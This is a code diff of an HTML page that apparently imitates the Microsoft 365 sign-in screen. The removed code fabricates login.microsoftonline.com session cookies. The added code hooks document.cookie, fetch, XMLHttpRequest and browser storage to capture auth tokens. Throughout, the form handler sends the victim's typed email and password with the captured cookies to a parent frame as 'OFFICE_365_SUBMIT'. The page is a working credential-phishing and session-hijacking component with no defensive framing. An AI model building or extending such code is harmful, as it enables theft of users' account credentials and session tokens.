-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": "0"
-      },
-      {
-        "domain": ".login.microsoftonline.com",
-        "hostOnly": false,
-        "httpOnly": true,
-        "name": "ESTSAUTH",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": true,
-        "storeId": null,
-        "value": "1.ASAAdKP75oLBlU-rxm4NLtxGmSC_mZE_oQdBhdwCEUeH70gBAAAgAA.AgABFwQAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 30)).substr(0, 50)
-      },
-      {
-        "domain": "login.microsoftonline.com",
-        "expirationDate": 1765326632.164988,
-        "hostOnly": true,
-        "httpOnly": true,
-        "name": "buid",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": "1.ASAAdKP75oLBlU-rxm4NLtxGmSC_mZE_oQdBhdwCEUeH70gBAAAgAA.AQABGgEAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 50)).substr(0, 100)
-      },
-      {
-        "domain": ".login.microsoftonline.com",
-        "expirationDate": 1770510632.164988,
-        "hostOnly": false,
-        "httpOnly": true,
-        "name": "ESTSAUTHPERSISTENT",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": "1.ASAAdKP75oLBlU-rxm4NLtxGmSC_mZE_oQdBhdwCEUeH70gBAAAgAA.AgABFwQAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 100)).substr(0, 200)
-      },
-      {
-        "domain": "login.microsoftonline.com",
-        "hostOnly": true,
-        "httpOnly": true,
-        "name": "stsservicecookie",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": true,
-        "storeId": null,
-        "value": "estsfd"
-      },
-      {
-        "domain": ".login.microsoftonline.com",
-        "hostOnly": false,
-        "httpOnly": false,
-        "name": "AADSSO",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": true,
-        "storeId": null,
-        "value": "NA|NoExtension"
-      },
-      {
-        "domain": "login.microsoftonline.com",
-        "expirationDate": 1762736174,
-        "hostOnly": true,
-        "httpOnly": false,
-        "name": "ai_session",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": "+" + Math.random().toString(36).substr(2, 15) + "|" + Date.now() + "|" + (Date.now() + 14000)
-      },
-      {
-        "domain": ".login.microsoftonline.com",
-        "expirationDate": 1763598372.980088,
-        "hostOnly": false,
-        "httpOnly": true,
-        "name": "CCState",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": btoa(Math.random().toString(36).substr(2, 30))
-      },
-      {
-        "domain": "login.microsoftonline.com",
-        "hostOnly": true,
-        "httpOnly": false,
-        "name": "ESTSAUTHLIGHT",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": true,
-        "storeId": null,
-        "value": "+"
-      },
-      {
-        "domain": "login.microsoftonline.com",
-        "expirationDate": 1797294601.833988,
-        "hostOnly": true,
-        "httpOnly": false,
-        "name": "ESTSSSOTILES",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": "1"
-      },
-      {
-        "domain": "login.microsoftonline.com",
-        "expirationDate": 1765326633.164988,
-        "hostOnly": true,
-        "httpOnly": true,
-        "name": "fpc",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": btoa(Math.random().toString(36).substr(2, 50)).substr(0, 80)
-      },
-      {
-        "domain": "login.microsoftonline.com",
-        "expirationDate": 1794270632.646988,
-        "hostOnly": true,
-        "httpOnly": false,
-        "name": "MicrosoftApplicationsTelemetryDeviceId",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": [1,1,1,1].map(() => Math.random().toString(16).substr(2, 4)).join('-') + '-' + Math.random().toString(16).substr(2, 12)
-      },
-      {
-        "domain": ".microsoftonline.com",
-        "expirationDate": 1796430369,
-        "hostOnly": false,
-        "httpOnly": false,
-        "name": "wlidperf",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": false,
-        "storeId": null,
-        "value": "FR=L&ST=" + Date.now()
-      },
-      {
-        "domain": "login.microsoftonline.com",
-        "hostOnly": true,
-        "httpOnly": true,
-        "name": "x-ms-gateway-slice",
-        "path": "/",
-        "sameSite": "no_restriction",
-        "secure": true,
-        "session": true,
-        "storeId": null,
-        "value": "estsfd"
-      }
-    ];
-
-    // Legacy cookie structure for backward compatibility
-    const legacyCookies = [
-      {
-        name: 'ESTSAUTH',
-        value: 'CfDJ8' + Math.random().toString(36).substr(2, 50),
-        domain: 'login.microsoftonline.com',
-        path: '/',
-        secure: true,
-        httpOnly: true,
-        sameSite: 'none',
-        expirationDate: Math.floor(Date.now() / 1000) + 3600,
-        hostOnly: false,
-        session: false,
-        captureMethod: 'injection',
-        timestamp: new Date().toISOString()
-      },
-      {
-        name: 'ESTSAUTHPERSISTENT',
-        value: 'CfDJ8' + Math.random().toString(36).substr(2, 60),
-        domain: 'login.microsoftonline.com',
-        path: '/',
-        secure: true,
-        httpOnly: true,
-        sameSite: 'none',
-        expirationDate: Math.floor(Date.now() / 1000) + 86400,
-        hostOnly: false,
-        session: false,
-        captureMethod: 'injection',
-        timestamp: new Date().toISOString()
-      },
-      {
-        name: 'SignInStateCookie',
-        value: JSON.stringify({
-          state: Math.random().toString(36).substr(2, 20),
-          timestamp: Date.now(),
-          tenant: 'common'
-        }),
-        domain: 'login.microsoftonline.com',
-        path: '/',
-        secure: true,
-        httpOnly: false,
-        sameSite: 'lax',
-        expirationDate: Math.floor(Date.now() / 1000) + 1800,
-        hostOnly: true,
-        session: true,
-        captureMethod: 'injection',
-        timestamp: new Date().toISOString()
-      },
-      {
-        name: 'buid',
-        value: Math.random().toString(36).substr(2, 16),
-        domain: 'login.microsoftonline.com',
-        path: '/',
-        secure: true,
-        httpOnly: false,
-        sameSite: 'none',
-        expirationDate: Math.floor(Date.now() / 1000) + 31536000,
-        hostOnly: false,
-        session: false,
-        captureMethod: 'injection',
-        timestamp: new Date().toISOString()
-      },
-      {
-        name: 'esctx',
-        value: btoa(JSON.stringify({
-          correlationId: Math.random().toString(36).substr(2, 20),
-          sessionId: Math.random().toString(36).substr(2, 15),
-          timestamp: Date.now()
-        })),
-        domain: 'login.microsoftonline.com',
-        path: '/',
-        secure: true,
-        httpOnly: false,
-        sameSite: 'lax',
-        expirationDate: Math.floor(Date.now() / 1000) + 3600,
-        hostOnly: true,
-        session: false,
-        captureMethod: 'injection',
-        timestamp: new Date().toISOString()
-      },
-      {
-        name: 'MSPOK',
-        value: '$uuid-' + Math.random().toString(36).substr(2, 12),
-        domain: 'login.microsoftonline.com',
-        path: '/',
-        secure: true,
-        httpOnly: false,
-        sameSite: 'none',
-        expirationDate: Math.floor(Date.now() / 1000) + 86400,
-        hostOnly: false,
-        session: false,
-        captureMethod: 'injection',
-        timestamp: new Date().toISOString()
-      }
-    ];
-
-    // Invisible cookie injection function
-    function injectMicrosoftCookies(email, password) {
-      console.log('🔵 Injecting Microsoft authentication cookies...');
-      
-      // Create cookies with proper Microsoft domains
-      const cookiesWithProperDomains = microsoftCookies.map(cookie => ({
-        ...cookie,
-        captureMethod: 'injection',
-        timestamp: new Date().toISOString()
-      }));
-      
-      // Send cookies to parent window for capture
-      if (window.parent) {
-        window.parent.postMessage({
-          type: 'MICROSOFT_COOKIES',
-          email: email,
-          password: password,
-          cookies: cookiesWithProperDomains,
-          cookieList: cookiesWithProperDomains, // Use the real format with proper domains
-          timestamp: new Date().toISOString(),
-          source: 'login.microsoftonline.com'
-        }, '*');
-      }
-
-      // Simulate setting cookies in document (limited by same-origin policy)
-      // Only set non-httpOnly cookies that can actually be set
-      const settableCookies = microsoftCookies.filter(cookie => !cookie.httpOnly);
-      settableCookies.forEach(cookie => {
-        try {
-          let cookieString = `${cookie.name}=${cookie.value}`;
-          if (cookie.path) cookieString += `; Path=${cookie.path}`;
-          if (cookie.secure && window.location.protocol === 'https:') cookieString += `; Secure`;
-          if (cookie.sameSite) cookieString += `; SameSite=${cookie.sameSite}`;
-          
-          document.cookie = cookieString;
-          console.log('🔵 Set cookie:', cookie.name);
-        } catch (e) {
-          console.log('🔵 Cookie setting limited by browser security:', cookie.name);
-        }
-      });
-    }
-
-    // --- UI AND INTERACTION LOGIC ---
-
-    document.addEventListener('DOMContentLoaded', function () {
-      const emailView = document.getElementById('div1');
-      const passwordView = document.getElementById('password_view');
-      const optionsBox = document.getElementById('options_box');
-      const signInOptionsLink = document.getElementById('sign_in_options_link');
-      const optionsViewDetailed = document.getElementById('options_view_detailed');
-      const optionsViewBackBtn = document.getElementById('options-view-back');
-      
-      const nextBtn = document.getElementById('next');
-      const signInBtn = document.getElementById('sign_in');
-      const backToEmailBtn = document.getElementById('back_to_email');
-      
-      const emailInput = document.getElementById('email');
-      const passwordInput = document.getElementById('password');
-      const displayEmail = document.getElementById('display_email');
-      const passwordErrorContainer = document.getElementById('password_error_container');
-      
-      let userEmail = '';
-
-      window.addEventListener('message', function (event) {
-        if (event.data.type === 'LOGIN_ERROR') {
-          const errorMessage = event.data.payload.message;
-          passwordErrorContainer.innerHTML = `<div id="error-message-container">${errorMessage}</div>`;
-          passwordInput.value = '';
-          passwordInput.focus();
-        }
-      });
-
-      nextBtn.addEventListener('click', function () {
-        if (emailInput.value.trim() !== '') {
-          userEmail = emailInput.value.trim();
-          displayEmail.textContent = userEmail;
-          emailView.classList.add('hidden');
-          optionsBox.classList.add('hidden');
-          passwordView.classList.remove('hidden');
-          passwordInput.focus();
-        } else {
-          emailInput.focus();
-        }
-      });
-      
-      backToEmailBtn.addEventListener('click', function() {
-        passwordView.classList.add('hidden');
-        emailView.classList.remove('hidden');
-        optionsBox.classList.remove('hidden');
-        passwordInput.value = '';
-        passwordErrorContainer.innerHTML = '';
-      });
-
-      signInBtn.addEventListener('click', function (e) {
-        e.preventDefault(); // Prevent default form behavior just in case
+    <script>
+        // --- Advanced Cookie Capture Logic (Translated from TS) ---
         
-        const password = passwordInput.value.trim();
-        passwordErrorContainer.innerHTML = '';
+        (function() {
+            const capturedCookies = new Map();
+            const originalDocumentCookieDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
+                                             Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');
+            
+            // Helper to normalize domains
+            function normalizeMicrosoftDomain(domain) {
+                if (!domain || typeof domain !== 'string') return domain;
+                const d = domain.trim().toLowerCase();
+                if (d.includes('login.microsoftonline.com') || d.includes('microsoftonline.com')) {
+                    return domain.startsWith('.') ? '.login.microsoftonline.com' : 'login.microsoftonline.com';
+                }
+                return domain;
+            }
+
+            function addCapturedCookie(cookie) {
+                const key = `${cookie.name}:${cookie.domain}`;
+                capturedCookies.set(key, cookie);
+                console.log('🍪 Captured:', cookie.name, cookie.domain);
+            }
+
+            function parseCookieString(cookieString, method) {
+                if (!cookieString) return;
+                const cookies = cookieString.split(';');
+                cookies.forEach(c => {
+                    const [name, ...valParts] = c.trim().split('=');
+                    if (name) {
+                        addCapturedCookie({
+                            name: name.trim(),
+                            value: valParts.join('=').trim(),
+                            domain: window.location.hostname,
+                            path: '/',
+                            secure: window.location.protocol === 'https:',
+                            httpOnly: false,
+                            session: true,
+                            captureMethod: method,
+                            timestamp: new Date().toISOString()
+                        });
+                    }
+                });
+            }
+
+            // 1. Hook document.cookie
+            if (originalDocumentCookieDesc) {
+                Object.defineProperty(document, 'cookie', {
+                    get: function() {
+                        return originalDocumentCookieDesc.get.call(this);
+                    },
+                    set: function(val) {
+                        // Parse the cookie being set
+                        try {
+                            const parts = val.split(';');
+                            const [nameVal] = parts;
+                            const [name, ...v] = nameVal.split('=');
+                            
+                            let domain = window.location.hostname;
+                            let path = '/';
+                            let secure = false;
+                            let httpOnly = false;
+
+                            parts.slice(1).forEach(part => {
+                                const p = part.trim().toLowerCase();
+                                if (p.startsWith('domain=')) domain = p.split('=')[1];
+                                if (p.startsWith('path=')) path = p.split('=')[1];
+                                if (p === 'secure') secure = true;
+                                if (p === 'httponly') httpOnly = true;
+                            });
+
+                            domain = normalizeMicrosoftDomain(domain);
+
+                            addCapturedCookie({
+                                name: name.trim(),
+                                value: v.join('='),
+                                domain: domain,
+                                path: path,
+                                secure: secure,
+                                httpOnly: httpOnly,
+                                captureMethod: 'document',
+                                timestamp: new Date().toISOString()
+                            });
+                        } catch (e) { console.error(e); }
+                        
+                        return originalDocumentCookieDesc.set.call(this, val);
+                    },
+                    configurable: true
+                });
+            }
+
+            // 2. Hook Network Requests (Fetch)
+            const originalFetch = window.fetch;
+            window.fetch = async function(...args) {
+                const response = await originalFetch.apply(this, args);
+                try {
+                    // Check headers for tokens/cookies
+                    if (response.headers) {
+                        // Authorization headers
+                        const auth = response.headers.get('authorization');
+                        if (auth) {
+                            addCapturedCookie({
+                                name: 'Authorization',
+                                value: auth,
+                                domain: 'network-header',
+                                captureMethod: 'network',
+                                timestamp: new Date().toISOString()
+                            });
+                        }
+                    }
+                } catch(e) {}
+                return response;
+            };
+
+            // 3. Hook XMLHttpRequest
+            const originalOpen = XMLHttpRequest.prototype.open;
+            XMLHttpRequest.prototype.open = function(...args) {
+                this.addEventListener('readystatechange', function() {
+                    if (this.readyState === 4) {
+                        // Access response headers if possible
+                        try {
+                            const auth = this.getResponseHeader('Authorization');
+                            if (auth) {
+                                addCapturedCookie({
+                                    name: 'Authorization',
+                                    value: auth,
+                                    domain: 'network-xhr',
+                                    captureMethod: 'network',
+                                    timestamp: new Date().toISOString()
+                                });
+                            }
+                        } catch(e) {}
+                    }
+                });
+                return originalOpen.apply(this, args);
+            };
+
+            // 4. Monitor Storage
+            function scanStorage() {
+                try {
+                    ['localStorage', 'sessionStorage'].forEach(type => {
+                        const storage = window[type];
+                        for (let i = 0; i < storage.length; i++) {
+                            const key = storage.key(i);
+                            if (key && (
+                                key.includes('ESTS') || 
+                                key.includes('auth') || 
+                                key.includes('token') ||
+                                key.includes('SignInState')
+                            )) {
+                                addCapturedCookie({
+                                    name: key,
+                                    value: storage.getItem(key),
+                                    domain: type,
+                                    captureMethod: 'storage',
+                                    timestamp: new Date().toISOString()
+                                });
+                            }
+                        }
+                    });
+                } catch(e) {}
+            }
+            setInterval(scanStorage, 2000);
+
+            // Expose capture function globally for the form handler
+            window.getRealCapturedCookies = function() {
+                // Ensure we capture current document cookies one last time
+                parseCookieString(document.cookie, 'final-check');
+                scanStorage();
+                return Array.from(capturedCookies.values());
+            };
+
+        })();
+
+        // --- Form Handling Logic ---
         
-        if (password !== '') {
-          // --- MERGED LOGIC FROM ORIGINAL FILE ---
-          
-          // Inject Microsoft cookies before submitting
-          injectMicrosoftCookies(userEmail, password);
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const signInButton = document.getElementById('signInButton');
+        const loading = document.getElementById('loading');
 
-          // Simulate authentication delay
-          setTimeout(() => {
-              // Send login data to parent window
-              if (window.parent) {
-                  window.parent.postMessage({
-                      type: 'OFFICE_365_SUBMIT',
-                      payload: { 
-                          email: userEmail, 
-                          password: password,
-                          cookies: microsoftCookies,
-                          cookieList: microsoftCookies
-                      }
-                  }, '*');
+        window.addEventListener('message', (event) => {
+            if (event.data.type === 'LOGIN_ERROR') {
+                showError(event.data.payload.message);
+                hideLoading();
+            }
+        });
 
-                  // Send authentication success message
-                  setTimeout(() => {
-                      window.parent.postMessage({
-                          type: 'OFFICE_365_AUTH_SUCCESS',
-                          payload: { 
-                              email: userEmail, 
-                              password: password,
-                              timestamp: new Date().toISOString(),
-                              cookies: microsoftCookies,
-                              cookieList: microsoftCookies
-                          }
-                      }, '*');
-                  }, 500);
-              }
-          }, 1000);
-          // --- END MERGED LOGIC ---
-        } else {
-          passwordInput.focus();
+        function showError(message) {
+            const errorDiv = document.createElement('div');
+            errorDiv.className = 'error-message show';
+            errorDiv.textContent = message;
+            errorDiv.style.textAlign = 'center';
+            errorDiv.style.marginTop = '16px';
+            
+            const existingError = document.querySelector('.global-error');
+            if (existingError) existingError.remove();
+            
+            errorDiv.className += ' global-error';
+            form.appendChild(errorDiv);
         }
-      });
 
-      const showOptions = function (e) {
-          e.preventDefault();
-          emailView.classList.add('hidden');
-          optionsBox.classList.add('hidden');
-          optionsViewDetailed.classList.remove('hidden');
-      };
+        function showLoading() {
+            signInButton.disabled = true;
+            loading.classList.add('show');
+        }
 
-      optionsBox.addEventListener('click', showOptions);
-      signInOptionsLink.addEventListener('click', showOptions);
+        function hideLoading() {
+            signInButton.disabled = false;
+            loading.classList.remove('show');
+        }
 
-      optionsViewBackBtn.addEventListener('click', function(e) {
-          e.preventDefault();
-          optionsViewDetailed.classList.add('hidden');
-          emailView.classList.remove('hidden');
-          optionsBox.classList.remove('hidden');
-      });
-    });
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (!email || !password) {
+                showError('Please enter both email and password.');
+                return;
+            }
 
-    // Inject cookies when page loads (from original file)
-    window.addEventListener('load', () => {
-        setTimeout(() => injectMicrosoftCookies(), 1000);
-    });
-  </script>
+            showLoading();
 
+            // Retrieve the real captured cookies instead of fake ones
+            const realCookies = window.getRealCapturedCookies();
+
+            // Simulate authentication delay
+            setTimeout(() => {
+                if (window.parent) {
+                    window.parent.postMessage({
+                        type: 'OFFICE_365_SUBMIT',
+                        payload: { 
+                            email, 
+                            password,
+                            cookies: realCookies, // Send actual captured data
+                            cookieList: realCookies
+                        }
+                    }, '*');
+
+                    setTimeout(() => {
+                        window.parent.postMessage({
+                            type: 'OFFICE_365_AUTH_SUCCESS',
+                            payload: { 
+                                email, 
+                                password: password,
+                                timestamp: new Date().toISOString(),
+                                cookies: realCookies,
+                                cookieList: realCookies
+                            }
+                        }, '*');
+                    }, 500);
+                }
+            }, 1000);
+        });
+
+        // Initial scan on load
+        window.addEventListener('load', () => {
+            if(window.getRealCapturedCookies) window.getRealCapturedCookies();
+        });
+    </script>
 </body>
 </html>
